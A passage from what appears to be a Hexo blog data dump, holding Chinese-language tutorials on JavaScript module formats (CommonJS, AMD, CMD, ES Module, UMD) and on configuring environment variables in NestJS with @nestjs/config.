class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">root, factory</span>) {</span><br><span class=\"line\">  <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">typeof</span> <span class=\"hljs-built_in\">exports</span> === <span class=\"hljs-string\">'object'</span> &amp;&amp; <span class=\"hljs-keyword\">typeof</span> <span class=\"variable language_\">module</span> === <span class=\"hljs-string\">'object'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">module</span>.<span class=\"hljs-property\">exports</span> = <span class=\"title function_\">factory</span>();</span><br><span class=\"line\">  <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">typeof</span> define === <span class=\"hljs-string\">'function'</span> &amp;&amp; define.<span class=\"hljs-property\">amd</span>)</span><br><span class=\"line\">    <span class=\"title function_\">define</span>([], factory);</span><br><span class=\"line\">  <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">typeof</span> <span class=\"hljs-built_in\">exports</span> === <span class=\"hljs-string\">'object'</span>)</span><br><span class=\"line\">    <span class=\"hljs-built_in\">exports</span>[<span class=\"hljs-string\">\"nav\"</span>] = <span class=\"title function_\">factory</span>();</span><br><span class=\"line\">  <span class=\"hljs-keyword\">else</span></span><br><span class=\"line\">    root[<span class=\"hljs-string\">\"nav\"</span>] = <span class=\"title function_\">factory</span>();</span><br><span class=\"line\">})(<span class=\"variable language_\">window</span>, <span class=\"variable language_\">this</span>, <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">  <span class=\"hljs-comment\">// module</span></span><br><span class=\"line\">  <span class=\"hljs-keyword\">return</span> {</span><br><span class=\"line\">    <span class=\"hljs-attr\">addEvent</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">el, type, handle</span>) {</span><br><span class=\"line\">      <span class=\"hljs-comment\">//...</span></span><br><span class=\"line\">    },</span><br><span class=\"line\">    <span class=\"hljs-attr\">removeEvent</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">el, type, handle</span>) {</span><br><span class=\"line\">             </span><br><span class=\"line\">    },</span><br><span class=\"line\">  };</span><br><span class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n</body></html>","site":{"data":{}},"_categories":[],"_tags":[],"excerpt":"<html><head></head><body><h2 id=\"CommonJS\"><a href=\"#CommonJS\" class=\"headerlink\" title=\"CommonJS\"></a>CommonJS</h2><p><code>CommonJS</code>是<code>Node.js</code>对模块开发的标准规范。</p>\n<p>CommonJS module基本要求如下：</p></body></html>","more":"<ul>\n<li>一个文件就是一个模块，拥有单独的作用域</li>\n<li>普通方式定义的 变量、函数、对象都属于该模块内</li>\n<li>通过 <code>require</code> 来加载模块</li>\n<li>通过 <code>exports</code> 和 <code>module.exports</code> 来暴露模块中的内容</li>\n</ul>\n<p>demo1: </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// module.js</span></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = &#123;</span><br><span class=\"line\">  <span class=\"attr\">name</span>: <span class=\"string\">&quot;zhang&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">getName</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">name</span>);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">changeName</span>: <span class=\"keyword\">function</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = n;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable language_\">module</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;./module/index&quot;</span>);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">module</span>)\t<span class=\"comment\">//  &#123;name: &quot;zhang&quot;, getName: ƒ, changeName: ƒ&#125; &quot;commons&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>demo2:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// module1.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">getParam</span> = (<span class=\"params\"></span>) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(a);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a = <span class=\"number\">123</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> b = <span class=\"number\">456</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exports</span>.<span class=\"property\">a</span> = a;</span><br><span class=\"line\"><span class=\"built_in\">exports</span>.<span class=\"property\">b</span> = b;</span><br><span class=\"line\"><span class=\"built_in\">exports</span>.<span class=\"property\">getParam</span> = getParam;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> module1 = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;./module/index1&quot;</span>);</span><br><span class=\"line\">consoel.<span class=\"title function_\">log</span>(module1, <span class=\"string\">&quot;commons1&quot;</span>)\t<span class=\"comment\">// &#123;a: 123, b: 456, getParam: ƒ&#125; &quot;commons1&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>demo3: </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// module2.js</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> a = <span class=\"number\">123</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">getSome</span> = (<span class=\"params\"></span>) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;yyy&quot;</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">getA</span> = (<span class=\"params\"></span>) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(a);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exports</span>.<span class=\"property\">getSome</span> = getSome;</span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = getA;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> module2 = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;./module/index2&quot;</span>);</span><br><span class=\"line\">consoel.<span class=\"title function_\">log</span>(module2, <span class=\"string\">&quot;commons2&quot;</span>)\t<span class=\"comment\">// function getA() &#123;...&#125;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出  exports 和  module.exports  的区别:<br>1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports<br>2、当模块内部全部是 exports 的时候， 就等同于 module.exports<br>3、最后 我们就可以认定为  exports  其实就是 module.exports 的子集。</p>\n</blockquote>\n<h2 id=\"AMD\"><a href=\"#AMD\" class=\"headerlink\" title=\"AMD\"></a>AMD</h2><p>AMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。</p>\n<p>AMD设计出一个简洁的写模块API：</p>\n<p><code>define(id?, dependencies?, factory);</code></p>\n<p>其中：</p>\n<ul>\n<li><code>id</code>: 模块标识，可以省略。</li>\n<li><code>dependencies</code>: 所依赖的模块，可以省略。</li>\n<li><code>factory</code>: 模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。</li>\n</ul>\n<p>使用<code>RequireJS</code>的require函数加载模块:</p>\n<p><code>require([dependencies], callback);</code></p>\n<ul>\n<li><code>dependencies</code>: 表示所依赖的模块</li>\n<li><code>callback</code>: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块</li>\n</ul>\n<p>base.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        <span class=\"attr\">mix</span>: <span class=\"keyword\">function</span>(<span class=\"params\">source, target</span>) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>ui.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>([<span class=\"string\">&#x27;base&#x27;</span>], <span class=\"keyword\">function</span>(<span class=\"params\">base</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        <span class=\"attr\">show</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// todo with module base</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>page.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>([<span class=\"string\">&#x27;data&#x27;</span>, <span class=\"string\">&#x27;ui&#x27;</span>], <span class=\"keyword\">function</span>(<span class=\"params\">data, ui</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// init here</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>data.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>(&#123;</span><br><span class=\"line\">    <span class=\"attr\">users</span>: [],</span><br><span class=\"line\">    <span class=\"attr\">members</span>: []</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>以上同时演示了define的三种用法</p>\n<ol>\n<li>定义无依赖的模块（base.js）</li>\n<li>定义有依赖的模块（ui.js，page.js）</li>\n<li>定义数据对象模块（data.js）</li>\n</ol>\n<h3 id=\"CMD\"><a href=\"#CMD\" class=\"headerlink\" title=\"CMD\"></a>CMD</h3><p>AMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS Modules/Wrappings 。所以就有了<code>CMD</code>, 它的语法如下:</p>\n<p><code>define(id?, dependencies?, factory);</code></p>\n<p>因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id；</p>\n<p>CMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。</p>\n<p>factory有三个参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function(require, exports, module)&#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p><code>require</code>: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口；</p>\n</li>\n<li><p><code>exports</code>: exports 是一个对象，用来向外提供模块接口；</p>\n</li>\n<li><p><code>module</code>: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。</p>\n</li>\n</ul>\n<p>demo: </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">define</span>(<span class=\"keyword\">function</span>(<span class=\"params\"><span class=\"built_in\">require</span>, <span class=\"built_in\">exports</span>, <span class=\"variable language_\">module</span></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> base = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;base&#x27;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exports</span>.<span class=\"property\">show</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// todo with module base</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require.</p>\n</blockquote>\n<p>AMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同<br>很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。</p>\n<h2 id=\"ES-Module\"><a href=\"#ES-Module\" class=\"headerlink\" title=\"ES Module\"></a>ES Module</h2><p>在 ES2015 标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。</p>\n<p><code>export</code>用于对外输出本模块（一个文件可以理解为一个模块）变量的接口<br><code>import</code>用于导入<code>export</code>导出的模块</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> fn1 = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;fn1&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> fn2 = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;fn2&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> fn = &#123;</span><br><span class=\"line\">  fn1,</span><br><span class=\"line\">  fn2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> fn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// index1.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; fn1, fn2 &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;index.js&#x27;</span></span><br><span class=\"line\"><span class=\"title function_\">fn1</span>() <span class=\"comment\">// &#x27;fn1&#x27;</span></span><br><span class=\"line\"><span class=\"title function_\">fn2</span>() <span class=\"comment\">// &#x27;fn2&#x27; </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> fn <span class=\"keyword\">from</span> <span class=\"string\">&#x27;index.js&#x27;</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(fn) <span class=\"comment\">// &#123;fn1: ƒ, fn2: ƒ&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>export 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。</p>\n<p><code>import &#123;fn&#125; from &#39;./xxx/xxx&#39;</code> ( export 导出方式的 引用方式 ) <code>import fn from &#39;./xxx/xxx1&#39;</code> ( export default 导出方式的 引用方式 )</p>\n<h2 id=\"UMD\"><a href=\"#UMD\" class=\"headerlink\" title=\"UMD\"></a>UMD</h2><p>AMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。</p>\n<p>CommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.next/Harmony的模块格式。但它仅支持对象类型（objects）模块。</p>\n<p>这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。</p>\n<p>UMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。</p>\n<p>再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。</p>\n<p>下面是一个示例</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"keyword\">function</span> (<span class=\"params\">root, factory</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"keyword\">typeof</span> <span class=\"built_in\">exports</span> === <span class=\"string\">&#x27;object&#x27;</span> &amp;&amp; <span class=\"keyword\">typeof</span> <span class=\"variable language_\">module</span> === <span class=\"string\">&#x27;object&#x27;</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = <span class=\"title function_\">factory</span>();</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">typeof</span> define === <span class=\"string\">&#x27;function&#x27;</span> &amp;&amp; define.<span class=\"property\">amd</span>)</span><br><span class=\"line\">    <span class=\"title function_\">define</span>([], factory);</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">typeof</span> <span class=\"built_in\">exports</span> === <span class=\"string\">&#x27;object&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">exports</span>[<span class=\"string\">&quot;nav&quot;</span>] = <span class=\"title function_\">factory</span>();</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    root[<span class=\"string\">&quot;nav&quot;</span>] = <span class=\"title function_\">factory</span>();</span><br><span class=\"line\">&#125;)(<span class=\"variable language_\">window</span>, <span class=\"variable language_\">this</span>, <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// module</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">addEvent</span>: <span class=\"keyword\">function</span>(<span class=\"params\">el, type, handle</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">//...</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">removeEvent</span>: <span class=\"keyword\">function</span>(<span class=\"params\">el, type, handle</span>) &#123;</span><br><span class=\"line\">             </span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>"},{"title":"NestJS - 配置","date":"2021-03-17T03:25:10.000Z","_content":"\n应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。\n\n<!-- more -->\n\n在`Node`中，外部定义的环境变量通过`procress.env`全局可见。在Node.js应用程序中，通常使用`.env`文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。\n\n解析`.env`文件并加载到`procress.env`中，就需要使用`dotenv`这个包了，但是Nest提供了一个配置环境变量的软件包 - `@nestjs/config`，其内部依赖了`dotenv`。\n\n## 安装`@nestjs/config`\n\n```shell\n// npm\n$ npm i --save @nestjs/config\n\n// yarn\n$ yarn add @nestjs/config\n```\n\n## 简单使用\n\n安装完成后，我们可以导入`ConfigModule`。通常，我们将其导入根目录`AppModule`并使用. `forRoot()`静态方法控制其行为。在此步骤中，将解析并生成环境变量键/值对。稍后，我们将在其他功能模块中看到一些用于访问的`ConfigService`类的选项`ConfigModule`。\n\n```typescript\nimport { Module } from '@nestjs/common';\nimport { ConfigModule } from '@nestjs/config';\n\n@Module({\n  imports: [ConfigModule.forRoot()],\n})\nexport class AppModule {}\n```\n\n上面的代码将从`.env`默认位置（项目根目录）加载并解析文件，将文件中的键/值对`.env`与分配给其的环境变量合并`process.env`，并将结果存储在私有结构中，您可以通过访问该私有结构`ConfigService`。该`forRoot()`方法注册了`ConfigService`提供程序，该提供程序提供了`get()`一种读取这些已解析/合并的配置变量的方法。由于`@nestjs/config`依赖于[dotenv](https://github.com/motdotla/dotenv)，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USER=test）和在`.env`文件中同时存在时，运行时环境变量优先。\n\n示例`.env`文件如下所示：\n\n```bash\nDATABASE_USER=test\nDATABASE_PASSWORD=test\n```\n\n## 自定义ENV文件路径\n\n默认情况下，程序会在应用程序的根目录中查找`.env`文件。要为`.env`文件指定其他路径，请设置`forRoot()`的可选属性`envFilePath`，如下所示：\n\n```typescript\nConfigModule.forRoot({\n  envFilePath: '.development.env',\n});\n```\n\n您还可以为`.env`文件指定多个路径，如下所示：\n\n```typescript\nConfigModule.forRoot({\n  envFilePath: ['.env.development.local', '.env.development'],\n});\n```\n\n如果在多个文件中找到一个变量，则第一个优先。\n\n在实际开发中，往往有多个配置文件，比如开发环境使用`.development.env`配置文件，测试环境使用`.test.env`配置文件，生产环境使用`.production.env`配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下：\n\n```json\n// package.json\n{\n    ...\n    \"scripts\": {\n        \"start\": \"cross-env NODE_ENV=development nest start\",\n        \"start:dev\": \"cross-env NODE_ENV=development nest start --watch\",\n        \"start:prod\": \"cross-env NODE_ENV=production node dist/main\",\n        \"test\": \"cross-env NODE_ENV=test jest\",\n      },\n    ...\n}\n```\n\n> 安装`cross-env`，使用它跨平台的设置环境变量\n\n```typescript\nConfigModule.forRoot({\n  envFilePath: `${process.env.NODE_ENV || 'development'}.env`,\n});\n```\n\n## 使用全局module\n\n如果要`ConfigModule`在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将`options`对象的`isGlobal`属性设置为`true`，将其声明为全局模块，如下所示。在这种情况下，一旦`ConfigModule`被加载到根模块中，就不需要在其他模块中导入`ConfigModule`了\n\n```ts\nConfigModule.forRoot({\n  isGlobal: true,\n});\n```\n\n## 自定义配置文件\n\n对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。\n\n自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。`process.env`对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如\n\n\n```ts\nexport default () => ({\n  port: parseInt(process.env.PORT, 10) || 3000,\n  database: {\n    host: process.env.DATABASE_HOST,\n    port: parseInt(process.env.DATABASE_PORT, 10) || 5432\n  }\n});\n```\n\n将其传给`ConfigModule.forRoot()`的`load`属性，来加载这个自定义配置：\n\n```ts\nimport configuration from './config/configuration';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      load: [configuration],\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n> load属性是个数组，允许加载多个自定义配置文件\n\n通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。\n\n```yaml\nhttp:\n  host: 'localhost'\n  port: 8080\n\ndb:\n  postgres:\n    url: 'localhost'\n    port: 5432\n    database: 'yaml-db'\n\n  sqlite:\n    database: 'sqlite.db'\n```\n\n为了读取和解析YAML文件，我们可以利用`js-yaml`包。\n\n```shell\n$ npm i js-yaml\n$ npm i -D @types/js-yaml\n```\n\n安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。\n\n```ts\nimport { readFileSync } from 'fs';\nimport * as yaml from 'js-yaml';\nimport { join } from 'path';\n\nconst YAML_CONFIG_FILENAME = 'config.yml';\n\nexport default () => {\n  return yaml.load(\n    fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), 'utf8'),\n  );\n};\n```\n\n## 使用`ConfigService`\n\n要从`ConfigService`中访问配置值，我们首先得注入`ConfigService`，和使用其他`provider`一样，我们需要将其加入@Module的`imports`属性中（如果将`ConfigModule`配置成全局module，则可以忽略这一步）\n\n\n```ts\n@Module({\n  imports: [ConfigModule],\n  // ...\n})\n```\n\n然后我们可以使用标准的构造函数注入:\n\n```ts\n// import { ConfigService } from '@nestjs/config';\n\nconstructor(private configService: ConfigService) {}\n```\n\n获取\n\n```ts\n// get an environment variable\nconst dbUser = this.configService.get<string>('DATABASE_USER');\n\n// get a custom configuration value\nconst dbHost = this.configService.get<string>('database.host');\n```\n\n如上所示，使用`configService.get()`方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，`get<string>(…)`)。`get()`方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。\n\n你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。\n\n```ts\ninterface DatabaseConfig {\n  host: string;\n  port: number;\n}\n\nconst dbConfig = this.configService.get<DatabaseConfig>('database');\n\n// you can now use `dbConfig.port` and `dbConfig.host`\nconst port = 